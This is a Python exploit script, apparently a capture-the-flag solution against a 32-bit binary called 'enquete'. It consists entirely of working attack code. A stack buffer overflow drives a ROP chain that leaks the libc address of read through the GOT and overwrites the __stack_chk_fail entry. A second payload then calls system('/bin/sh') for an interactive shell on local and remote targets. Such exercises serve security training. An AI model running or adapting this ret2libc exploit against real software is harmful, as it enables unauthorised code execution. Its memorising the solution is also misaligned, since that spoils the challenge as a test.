#!/usr/bin/env python
from sc_pwn import *

env = Environment('local', 'remote')
env.set_item('mode',    local = 'SOCKET', remote = 'SOCKET')
env.set_item('target',  local   = {'host':'192.168.75.147','port':8080}, \
                        remote  = {'host':'10.100.6.1','port':28353})
env.set_item('libc',    local   = 'D:\CTF\FILES\libc-2.19.so_x86_local', \
                        remote  = 'D:\CTF\FILES\libc-2.19.so_x86_local')
env.select()

libc = ELF(env.libc)
binf = ELF('enquete-3334b634afc2829a282ad1910a7b4dd8a0c66f1b', rop = True)
addr_bss            = binf.section('.bss')
addr_got_stack_chk  = binf.got('__stack_chk_fail')
addr_got_read       = binf.got('read')
addr_main           = binf.function('main')
addr_ret            = binf.ropgadget('ret')
addr_popx2          = binf.ropgadget('pop', 'pop', 'ret')

#==========
def attack(cmn):
    exploit_st1  = 'a'*0x50
    exploit_st1 += pack_32(addr_popx2)
    exploit_st1 += pack_32(addr_got_read)
    exploit_st1 += pack_32(addr_got_stack_chk)
    exploit_st1 += pack_32(addr_main+78)

    cmn.read_until('>> ')
    cmn.sendln(exploit_st1)

    cmn.read_until()
    addr_libc_read  = unpack_32(mold_32(cmn.read(4)))
    libc.set_location('read', addr_libc_read)
    addr_libc_system    = libc.function('system')
    addr_libc_exit      = libc.function('exit')
    
    cmn.read_until('>> ')
    cmn.sendln(pack_32(addr_ret))

    exploit_st2  = 'a'*0x50
    exploit_st2 += pack_32(addr_libc_system)
    exploit_st2 += pack_32(addr_libc_exit)
    exploit_st2 += pack_32(addr_bss)

    cmn.read_until('>> ')
    cmn.sendln(exploit_st2)
    cmn.read_until('>> ')
    cmn.sendln('/bin/sh')
    
#==========

if __name__=='__main__':
    cmn = Communicate(env.target, env.mode)
    attack(cmn)

    sh = Shell(cmn)
    sh.select()
    del(sh)
    #Interact(cmn).worker(False)
    
    del(cmn)
    
#==========
